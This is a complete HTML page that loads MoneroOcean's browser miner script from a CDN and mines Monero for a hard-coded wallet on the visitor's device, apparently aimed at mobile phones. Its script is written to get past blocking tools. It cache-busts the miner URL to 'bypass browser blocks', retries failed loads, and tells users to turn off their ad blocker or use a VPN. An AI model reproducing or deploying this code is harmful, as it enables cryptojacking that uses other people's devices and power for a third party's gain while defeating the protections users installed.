<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GHOST_v31_BYPASS</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        :root { --ai: #00ff41; --bg: #0a0a0a; --dim: #1a1a1a; }
        body { background: var(--bg); color: var(--ai); font-family: monospace; padding: 20px; text-align: center; }
        .shell { border: 2px solid var(--dim); padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; }
        #log { font-size: 10px; color: #666; height: 100px; overflow-y: auto; background: #000; padding: 10px; margin-top: 10px; text-align: left; border: 1px solid #222; }
        button { width: 100%; padding: 15px; background: var(--ai); border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .status-box { margin-bottom: 20px; border-bottom: 1px solid var(--dim); padding-bottom: 10px; }
    </style>
</head>
<body>
    <div class="shell">
        <div class="status-box">
            <div id="status" style="color: #fff;">ENGINE: WAITING</div>
            <div id="hps" style="font-size: 24px;">0.00 H/s</div>
        </div>

        <button id="start_btn">FORCE INITIALIZE</button>
        <div id="log">> Boot sequence ready...</div>
    </div>

<script>
    const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
    let retryCount = 0;

    const log = (m) => {
        const t = new Date().toLocaleTimeString();
        document.getElementById('log').innerHTML = `[${t}] ${m}<br>` + document.getElementById('log').innerHTML;
    };

    // This function forces a fresh fetch to bypass browser blocks
    async function forceLoadMiner() {
        if (typeof MoneroOcean !== 'undefined') {
            startEngine();
            return;
        }

        log("Bypassing cache & fetching core...");
        const script = document.createElement('script');
        // Added a timestamp parameter to prevent the browser from using a cached (blocked) version
        script.src = "https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io@master/webminer.js?v=" + Date.now();
        
        script.onload = () => {
            log("Core successfully injected.");
            startEngine();
        };

        script.onerror = () => {
            retryCount++;
            log(`Fetch failed (Attempt ${retryCount})...`);
            if (retryCount < 3) {
                setTimeout(forceLoadMiner, 2000); // Retry every 2 seconds
            } else {
                log("CRITICAL: CDN Blocked. Use a VPN or Disable AdBlock.");
            }
        };

        document.head.appendChild(script);
    }

    function startEngine() {
        try {
            const miner = new MoneroOcean.Miner({
                address: WALLET,
                cmd: "Mobile_Bypass_v31",
                threads: Math.max(1, navigator.hardwareConcurrency / 2),
                throttle: 0.2 // 20% Idle to prevent phone from melting
            });

            miner.start();
            document.getElementById('status').innerText = "ENGINE: ONLINE";
            log("Threads allocated: " + miner.getNumThreads());

            setInterval(() => {
                document.getElementById('hps').innerText = miner.getHashesPerSecond().toFixed(2) + " H/s";
            }, 1000);

        } catch (e) {
            log("Engine Error: " + e.message);
        }
    }

    document.getElementById('start_btn').onclick = forceLoadMiner;
</script>
</body>
</html>
